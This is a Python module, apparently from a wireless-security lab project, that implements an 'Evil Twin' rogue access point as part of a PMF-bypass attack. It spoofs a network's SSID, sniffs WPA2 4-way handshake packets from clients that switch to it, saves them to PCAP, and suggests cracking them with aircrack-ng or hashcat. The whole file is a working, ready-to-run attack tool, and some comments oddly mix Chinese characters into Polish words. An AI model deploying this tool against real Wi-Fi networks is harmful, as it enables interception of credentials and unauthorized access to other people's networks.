#!/usr/bin/env python3
"""
PMF Bypass — Evil Twin AP Module

Tworzy fałszywy Access Point z tym samym SSID co合法ny AP,
na kanale docelowym (po CSA injection). Przechwytuje 4-way handshake
od klienta który przełączył się na złośliwy kanał.

Usage (as module):
    from attacks.evil_twin import EvilTwinAP
    evil = EvilTwinAP(ssid="PMF_Lab_Secure", channel=11, iface="wlan2")
    evil.start()
    handshake = evil.capture_handshake(timeout=30)
    evil.save_handshake(handshake, "captured.pcap")
    evil.stop()

Usage (standalone):
    sudo python3 attacks/evil_twin.py --ssid PMF_Lab_Secure --channel 11
"""

import argparse
import os
import signal
import sys
import time
from datetime import datetime
from pathlib import Path

# Note: In Mininet-WiFi context, these imports work via mn_wifi.
# For standalone use outside Mininet, use system hostapd.
try:
    from mn_wifi.net import Mininet_wifi
except ImportError:
    Mininet_wifi = None

from scapy.all import sniff, wrpcap, EAPOL


class EvilTwinAP:
    """
    Evil Twin Access Point — fałszywy AP do przechwytywania handshake.

    Uruchamiany na kanale docelowym po ataku CSA injection.
    Klient widzi znajomy SSID i próbuje się połączyć → ujawnia handshake.
    """

    def __init__(self, ssid, channel, iface=None, passphrase=None):
        self.ssid = ssid
        self.channel = channel
        self.iface = iface
        self.passphrase = passphrase or "LabTest123!"  # Must match合法ny AP
        self._running = False
        self._net = None
        self._ap = None
        self._handshake_packets = []

    def start(self):
        """Uruchamia Evil Twin AP."""
        if Mininet_wifi is None:
            self._start_standalone()
            return

        self._net = Mininet_wifi()
        self._ap = self._net.addAccessPoint(
            "evil_twin",
            ssid=self.ssid,
            mode="g",
            channel=str(self.channel),
            failMode="standalone",
        )
        self._net.start()
        self._running = True
        print(f"[EvilTwin] Started on channel {self.channel}, SSID: {self.ssid}")

    def _start_standalone(self):
        """Uruchamia Evil Twin AP używając systemowego hostapd (poza Mininet)."""
        import subprocess
        import tempfile

        hostapd_conf = f"""
interface={self.iface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
wpa=2
wpa_passphrase={self.passphrase}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
        self._conf_file = tempfile.NamedTemporaryFile(
            mode='w', suffix='.conf', delete=False
        )
        self._conf_file.write(hostapd_conf)
        self._conf_file.close()

        print(f"[EvilTwin] Starting hostapd on {self.iface}, channel {self.channel}")

        self._hostapd = subprocess.Popen(
            ["hostapd", self._conf_file.name],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        self._running = True
        time.sleep(2)

    def capture_handshake(self, timeout=30):
        """
        Nasłuchuje pakietów EAPOL (4-way handshake) na interfejsie AP.

        Args:
            timeout: czas nasłuchiwania w sekundach

        Returns:
            Lista przechwyconych pakietów EAPOL
        """
        if not self._running:
            raise RuntimeError("Evil Twin AP not running. Call start() first.")

        iface = self.iface or "evil_twin-wlan1"
        self._handshake_packets = []

        def on_packet(pkt):
            if pkt.haslayer(EAPOL):
                self._handshake_packets.append(pkt)
                print(f"[EvilTwin] EAPOL #{len(self._handshake_packets)} captured "
                      f"from {pkt.addr2 if hasattr(pkt, 'addr2') else 'unknown'}")

        print(f"[EvilTwin] Listening on {iface} for {timeout}s...")
        sniff(iface=iface, prn=on_packet, timeout=timeout, store=0)

        return self._handshake_packets

    def save_handshake(self, output_path):
        """Zapisuje przechwycony handshake do pliku PCAP."""
        if not self._handshake_packets:
            print("[EvilTwin] No handshake packets to save.")
            return False

        wrpcap(output_path, self._handshake_packets)
        print(f"[EvilTwin] Handshake saved to {output_path} "
              f"({len(self._handshake_packets)} packets)")
        return True

    def stop(self):
        """Zatrzymuje Evil Twin AP i sprząta."""
        self._running = False

        if hasattr(self, '_hostapd') and self._hostapd:
            self._hostapd.terminate()
            self._hostapd.wait()

        if self._net:
            self._net.stop()

        if hasattr(self, '_conf_file'):
            os.unlink(self._conf_file.name)

        print("[EvilTwin] Stopped")


def parse_args():
    parser = argparse.ArgumentParser(description="PMF Bypass: Evil Twin AP")
    parser.add_argument("--ssid", default="PMF_Lab_Secure",
                        help="SSID to spoof (must match合法ny AP)")
    parser.add_argument("--channel", type=int, default=11,
                        help="Channel for Evil Twin AP")
    parser.add_argument("--iface", default=None,
                        help="Wireless interface (for standalone mode)")
    parser.add_argument("--passphrase", default="LabTest123!",
                        help="WPA passphrase (must match合法ny AP)")
    parser.add_argument("--capture-timeout", type=int, default=30,
                        help="Seconds to wait for handshake")
    parser.add_argument("--out", default="evil_twin_handshake.pcap",
                        help="Output PCAP file")
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()

    evil = EvilTwinAP(
        ssid=args.ssid,
        channel=args.channel,
        iface=args.iface,
        passphrase=args.passphrase,
    )

    def cleanup(sig, frame):
        evil.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    try:
        evil.start()
        handshake = evil.capture_handshake(timeout=args.capture_timeout)

        if handshake:
            evil.save_handshake(args.out)
            print(f"\n[+] Success! {len(handshake)} EAPOL packets captured.")
            print(f"    Output: {args.out}")
            print(f"    Next step: crack with aircrack-ng or hashcat")
        else:
            print("\n[-] No handshake captured. Possible reasons:")
            print("    - Target did not switch to this channel")
            print("    - PMF protected the CSA frame")
            print("    - Client already has valid session (no re-auth needed)")
    finally:
        evil.stop()
